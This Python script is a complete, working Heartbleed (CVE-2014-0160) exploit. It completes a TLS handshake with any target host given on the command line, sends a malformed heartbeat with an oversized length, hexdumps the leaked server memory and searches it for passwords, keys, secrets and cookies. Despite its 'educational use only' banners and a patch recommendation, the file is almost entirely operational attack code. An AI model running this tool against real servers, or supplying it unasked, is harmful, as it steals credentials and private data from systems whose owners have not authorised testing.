#!/usr/bin/env python3
"""
Heartbleed Attack - Complete Implementation
Based on original exploit by Jared Stafford with educational modifications

CVE-2014-0160 - OpenSSL TLS Heartbeat Extension Memory Disclosure
Educational purposes only - Use only in controlled environments
"""

import sys
import struct
import socket
import time
import select
import argparse
from typing import Optional

def h2bin(x: str) -> bytes:
    """Convert hex string to binary"""
    return bytes.fromhex(x.replace(' ', '').replace('\n', ''))

# TLS versions to test
TLS_VERSIONS = [
    ('TLS 1.0', '03 01'),
    ('TLS 1.1', '03 02'), 
    ('TLS 1.2', '03 03')
]

# Client Hello for TLS handshake
CLIENT_HELLO = h2bin('''
16 03 02 00 dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

def create_heartbeat(version_hex: str, payload_length: int) -> bytes:
    """Create malicious heartbeat packet"""
    version_bytes = h2bin(version_hex)
    heartbeat = struct.pack('>B', 0x18)  # Heartbeat type
    heartbeat += version_bytes
    heartbeat += struct.pack('>H', 0x0003)  # Record length
    heartbeat += struct.pack('>B', 0x01)   # Heartbeat request
    heartbeat += struct.pack('>H', payload_length)  # Payload length
    return heartbeat

def hexdump(data: bytes, start_offset: int = 0) -> None:
    """Display data in hexdump format"""
    for i in range(0, len(data), 16):
        # Offset
        print(f'{start_offset + i:08x}: ', end='')
        
        # Hex bytes
        for j in range(16):
            if i + j < len(data):
                print(f'{data[i + j]:02x} ', end='')
            else:
                print('   ', end='')
            
            if j == 7:  # Space in middle
                print(' ', end='')
        
        print(' ', end='')
        
        # ASCII representation
        for j in range(16):
            if i + j < len(data):
                b = data[i + j]
                if 32 <= b <= 126:
                    print(chr(b), end='')
                else:
                    print('.', end='')
            else:
                print(' ', end='')
        print()

def recvall(sock: socket.socket, length: int, timeout: int = 5) -> Optional[bytes]:
    """Receive exactly length bytes from socket"""
    endtime = time.time() + timeout
    data = b''
    remaining = length
    
    while remaining > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        
        rlist, _, _ = select.select([sock], [], [], rtime)
        if sock in rlist:
            chunk = sock.recv(remaining)
            if not chunk:  # EOF
                return None
            data += chunk
            remaining -= len(chunk)
    
    return data

def recvmsg(sock: socket.socket) -> tuple:
    """Receive and parse TLS message"""
    # Read 5-byte header
    header = recvall(sock, 5)
    if not header:
        return None, None, None
    
    try:
        msg_type, version, length = struct.unpack('>BHH', header)
    except struct.error:
        return None, None, None
    
    # Read payload
    payload = recvall(sock, length, 10)
    if payload is None:
        return None, None, None
    
    return msg_type, version, payload

def test_heartbleed(host: str, port: int, payload_length: int, 
                   tls_version: tuple, num_attempts: int = 1) -> bool:
    """Test for Heartbleed vulnerability"""
    version_name, version_hex = tls_version
    
    print(f"\n[*] Testing {version_name} with payload length {payload_length:#06x}")
    
    for attempt in range(num_attempts):
        if num_attempts > 1:
            print(f"[*] Attempt {attempt + 1}/{num_attempts}")
        
        try:
            # Create socket and connect
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            
            # Send Client Hello
            sock.send(CLIENT_HELLO)
            
            # Wait for Server Hello Done
            server_hello_done = False
            while not server_hello_done:
                msg_type, _, payload = recvmsg(sock)
                if msg_type is None:
                    print("[-] Server closed connection during handshake")
                    break
                
                # Server Hello Done message
                if msg_type == 22 and payload and len(payload) > 0 and payload[0] == 0x0E:
                    server_hello_done = True
            
            if not server_hello_done:
                sock.close()
                continue
            
            # Send malicious heartbeat
            heartbeat = create_heartbeat(version_hex, payload_length)
            sock.send(heartbeat)
            
            # Receive response
            response_received = False
            extra_data_received = False
            
            while True:
                msg_type, _, payload = recvmsg(sock)
                
                if msg_type is None:
                    if not response_received:
                        print("[-] No heartbeat response received")
                    break
                
                if msg_type == 24:  # Heartbeat response
                    response_received = True
                    
                    if len(payload) > 3:
                        print(f"[+] Received {len(payload)} bytes in heartbeat response")
                        print("[!] Server returned more data than expected!")
                        
                        # Display interesting parts
                        print("\n[*] Memory dump (first 512 bytes):")
                        hexdump(payload[:512])
                        
                        # Search for interesting strings
                        interesting = [
                            b'admin', b'password', b'secret', b'key',
                            b'login', b'user', b'pass', b'cookie'
                        ]
                        
                        found_interesting = False
                        for pattern in interesting:
                            if pattern in payload:
                                pos = payload.find(pattern)
                                context = payload[max(0, pos-20):min(len(payload), pos+50)]
                                print(f"[!] Found '{pattern.decode()}' at offset {pos:#x}")
                                try:
                                    print(f"     Context: {context.decode('utf-8', errors='ignore')}")
                                except:
                                    pass
                                found_interesting = True
                        
                        if not found_interesting:
                            print("[-] No obvious sensitive data found in this response")
                            print("[!] Try multiple attempts or different payload lengths")
                        
                        extra_data_received = True
                    else:
                        print("[-] Server processed malformed heartbeat but returned no extra data")
                    
                    break
                
                elif msg_type == 21:  # Alert
                    print("[-] Server returned TLS alert")
                    hexdump(payload)
                    break
            
            sock.close()
            
            if extra_data_received:
                return True
                
        except socket.timeout:
            print("[-] Connection timeout")
        except ConnectionRefusedError:
            print("[-] Connection refused")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

def main():
    parser = argparse.ArgumentParser(
        description='Heartbleed Attack (CVE-2014-0160) - Educational Use Only',
        epilog='Example: ./attack.py www.vulnerable-site.com -l 0x4000'
    )
    
    parser.add_argument('host', help='Target host')
    parser.add_argument('-p', '--port', type=int, default=443, help='Target port')
    parser.add_argument('-l', '--length', type=lambda x: int(x, 0), default=0x4000,
                       help='Payload length (hex, default: 0x4000)')
    parser.add_argument('-n', '--attempts', type=int, default=1,
                       help='Number of attempts per TLS version')
    parser.add_argument('--all-versions', action='store_true',
                       help='Test all TLS versions')
    
    args = parser.parse_args()
    
    print("🔓 Heartbleed Attack Tool (CVE-2014-0160)")
    print("=" * 50)
    print(f"Target: {args.host}:{args.port}")
    print(f"Payload Length: {args.length:#06x}")
    print(f"Attempts: {args.attempts}")
    print("=" * 50)
    print("⚠️  FOR EDUCATIONAL USE ONLY")
    print("=" * 50)
    
    vulnerable = False
    versions_to_test = TLS_VERSIONS if args.all_versions else [TLS_VERSIONS[2]]  # Default: TLS 1.2
    
    for tls_version in versions_to_test:
        if test_heartbleed(args.host, args.port, args.length, tls_version, args.attempts):
            vulnerable = True
            print(f"\n[!] 💀 VULNERABLE to Heartbleed with {tls_version[0]}")
            # Don't break, continue testing other versions
    
    print("\n" + "=" * 50)
    if vulnerable:
        print("🎯 RESULT: SERVER IS VULNERABLE TO HEARTBLEED")
        print("💡 Recommendation: Update OpenSSL immediately")
    else:
        print("✅ RESULT: Server appears to be patched or not vulnerable")
    print("=" * 50)

if __name__ == '__main__':
    main()
